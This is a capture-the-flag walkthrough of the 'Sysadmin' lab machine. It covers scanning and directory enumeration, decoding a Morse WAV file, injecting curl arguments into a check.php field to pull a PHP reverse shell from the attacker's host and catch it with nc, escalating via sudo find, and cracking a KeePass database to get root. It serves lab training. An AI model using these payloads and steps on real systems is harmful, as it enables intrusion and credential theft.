#   SYSADMIN

***Remote Target IP: `10.0.0.23`***  
***Difficulty: `Medium`***

---

## #1 Reconnaissance

    root@kali ~/D/M/Sysadmin# nmap -sS -p- -A -T4 10.0.0.23

    PORT   STATE SERVICE VERSION                                                                              
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                       
    | ssh-hostkey:                                                                                            
    |   2048 79:5c:c4:27:1f:02:33:77:6f:56:ed:88:98:22:4b:ca (RSA)                                            
    |   256 20:46:f8:a9:b4:32:c4:56:4b:e6:54:97:47:30:dd:7a (ECDSA)                                           
    |_  256 a1:1c:43:50:d6:03:14:27:69:c0:11:45:7e:df:25:e1 (ED25519)                                         
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))                                                       
    |_http-title: Apache2 Debian Default Page: It works                                                       
    |_http-server-header: Apache/2.4.38 (Debian)

### - HTTP | Port 80
Let's start enumerating HTTP.  
Going to **`http://10.0.0.23`** we have the default page of apache2.

![image](https://user-images.githubusercontent.com/76552238/173342450-b642511e-8775-4352-a85c-24288ca07e78.png)

    root@kali ~/D/M/Sysadmin# gobuster dir -u http://10.0.0.23/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,html,txt

    /index.html           (Status: 200) [Size: 10701]
    /audio                (Status: 301) [Size: 306] [--> http://10.0.0.23/audio/]
    /uploads              (Status: 301) [Size: 308] [--> http://10.0.0.23/uploads/]

After scanning the remote server we found 2 directories, **`audio`** and **`uploads`**.
I tried a couple of scans but found nothing, then I tried finding files with audio extension in the **`/audio`** directory.

    root@kali ~/D/M/Sysadmin# gobuster dir -u http://10.0.0.23/audio -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x mp3,aac,alac,wav,dsd

    /secret.wav           (Status: 200) [Size: 1940444]

Downloading **`http://10.0.0.23/audio/secret.wav`** to our local machine we can use a [**Morse Code decoder**][1] to translate the .wav file to text.

![image](https://user-images.githubusercontent.com/76552238/173345028-4afe4c13-7771-4960-a1b3-ee3b567470fe.png)

<!--sysadmin.intranet.hmv-->

The text we got from the .wav file seems like a domain, let's add it to our **`/etc/hosts`** file and access it.

![image](https://user-images.githubusercontent.com/76552238/173345375-3910b38a-6acf-4aab-994f-0edc05d6f581.png)

An Intranet is a private, secure network used by employees for internal communication and information sharing.  
Let's scan the site for files and directories.

    root@kali ~/D/M/Sysadmin# gobuster dir -u http://sysadmin.intranet.hmv/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,php,html

    /check.php            (Status: 200) [Size: 414]
    /index.html           (Status: 200) [Size: 122]

After going to **`http://sysadmin.intranet.hmv/check.php`** we have an input field

![image](https://user-images.githubusercontent.com/76552238/173353351-a7342f2c-d95b-4b92-9cc0-c850347bedcf.png)

It seems that it gives use the content of a file or website we enter in the input field.  
For example, if we enter **`https://10.0.0.23`**, we get default page of apache2.

![image](https://user-images.githubusercontent.com/76552238/173354406-9e43d4a4-54ad-4d85-965f-2711ac673756.png)

If we enter no text into the input field we can see that the script is using the **`curl`** command.

![image](https://user-images.githubusercontent.com/76552238/173354822-3029f6f0-db1c-42fc-8eec-6b05fd845798.png)

Let's try to exploit the **`curl`** command to get a reverse shell on the remote machine.

---

## #2 Weaponization

According to the curl manual page, **`curl`** is a tool for transferring data from or to a server. The command is designed to work without user interaction.
We can download a file from our local server to the remote server and run it using the **`check.php`** page.  
Let's test this by creating a **`test.txt`** file on **`/var/www/html`** on our local machine and try to download it by abusing the input field in the **`check.php`** page.  
Using the **`-O`** operation, **`curl` ** can save files on the current machine.  

So on the remote server, we enter **`http://10.0.0.27/test.txt -o test.txt`** in the input field.

![image](https://user-images.githubusercontent.com/76552238/173389627-4512d914-0483-4d35-9d6b-30890b227331.png)

We can then access the file by going to **`http://sysadmin.intranet.hmv/test.txt`**.

![image](https://user-images.githubusercontent.com/76552238/173390411-25abebf7-20a3-4266-a734-940926364fd2.png)

So now we know we can upload a [**Reverse Shell Script**][2] to the remote server and get a shell.

### ***Remote Machine:***
Entering **`http://10.0.0.27/php-reverse-shell.php -O`** in the input field and then going to **`http://sysadmin.intranet.hmv/php-reverse-shell.php`** we get a reverse shell on the remote machine (See below).

### **Local Machine:**
    root@kali ~/D/M/Sysadmin# nc -lnvp 4444

![image](https://user-images.githubusercontent.com/76552238/173407409-bb8c1892-554e-4fa2-b4ea-00c5ba8f04c2.png)

## #3 Delivery 

Going to the **`/home`** directory we see a directory named **`tom`**. This means there is a user named **`tom`** on the machine.

    www-data@Sysadmin:~$ sudo -ll

    Matching Defaults entries for www-data on Sysadmin:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User www-data may run the following commands on Sysadmin:
        (tom) NOPASSWD: /usr/bin/find
    www-data@Sysadmin:/home$ sudo -ll
    sudo -ll
    Matching Defaults entries for www-data on Sysadmin:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User www-data may run the following commands on Sysadmin:

    Sudoers entry:
        RunAsUsers: tom
        Options: !authenticate
        Commands:
            /usr/bin/find

We can run the command **`find`** as the user **`tom`** on the remote machine.
We can [**abuse the ***`find`*** command**][3] to get a shell as the user **`tom`** on the machine.

![image](https://user-images.githubusercontent.com/76552238/173408362-5aa9eec0-46b2-4557-b53d-58c964029e07.png)

We can now read the first flag.

    tom@Sysadmin:~$ cat user.txt                                                                                               
    qPoxwFd0Igm00OLa5Dwubh9Cr 

There is a text file on the **`/home/tom`** directory.

    tom@Sysadmin:~$ cat notes.txt

    Hi Tom,                                                                                                    
                                                                                                            
    remember that due to security policies only you can access the resource..                                  
                                                                                                            
    I repeat,                                                                                                  
                                                                                                            
    only you                                                                                                   
                                                                                                            
                                                                                                            
                                                                                                            
                                                                                                            
                                                                                                            
    regads                                                                                                     
                                                                                                            
    admin 

Well interesting, let's find out what does "**the resource**" mean.  
After uploading [**linPeas**][4] to the machine, I found something interesting. Looking at the active ports on the machine, we have a port that din't show up in the initial NMAP scan.

    ╔══════════╣ Active Ports
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                              
    tcp     LISTEN   0        32             127.0.0.1:65123          0.0.0.0:*                                
    tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*     
    tcp     LISTEN   0        128                    *:80                   *:*     
    tcp     LISTEN   0        128                 [::]:22                [::]:*   

Let's see what is on that port.

    tom@Sysadmin:~$ telnet localhost 65123
    Trying ::1...
    Trying 127.0.0.1...
    Connected to localhost.
    Escape character is '^]'.
    220 (vsFTPd 3.0.3)

This port is running **`FTP`**. Let's see if the anonymous user is available.

    tom@Sysadmin:~$ ftp localhost 65123
    ftp: connect to address ::1: Connection refused
    Trying 127.0.0.1...
    Connected to localhost.
    220 (vsFTPd 3.0.3)
    Name (localhost:tom): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> 

And we are connected!  
We downloaded the file **`/db/root.kdbx`** from the ftp service onto our local machine. Files with the **`.kdbx`** extension mostly belong to the service **`KeePass`**. The files are encrypted using a private password. Luckily for us John The Ripper has a script called **`keepass2john`** that we can use.

    root@kali ~/D/M/Sysadmin# keepass2john root.kdbx > root_password.hash
    root@kali ~/D/M/Sysadmin# john --wordlist=/usr/share/wordlists/rockyou.txt root_password.hash 

<!--hardcore-->

![image](https://user-images.githubusercontent.com/76552238/173412548-b635e183-2318-4bed-8c0f-504631132e4c.png)

We can read the file by using the command **`keepassxc`** from the package **`keepassxc`**.

![image](https://user-images.githubusercontent.com/76552238/173414566-09a7e4e5-fee5-448b-98e4-f8cc500ca333.png)

![image](https://user-images.githubusercontent.com/76552238/173414677-0aaf9721-02b3-45bd-ac52-b59100cfc53d.png)

## #4 Exploitation

We got the password for the **`root`** user on the remote machine. Let's log in.

![image](https://user-images.githubusercontent.com/76552238/173414921-3e99398e-3844-42d9-89b1-fbc9b290700d.png)

We can now read the final flag and finish the CTF.

    root@Sysadmin:~# cat root.txt 
    AxOV2YqIX3i8pUll4Pq7YglFb

[1]: https://morsecode.world/international/decoder/audio-decoder-adaptive.html "Morse Code Adaptive Audio Decoder"

[2]: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php "Github: pentestmonkey's Php Reverse Shell"

[3]: https://gtfobins.github.io/gtfobins/find/ "gtfobins: Find Command Privilege Escalation"

[4]: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS "Github: LinPeas"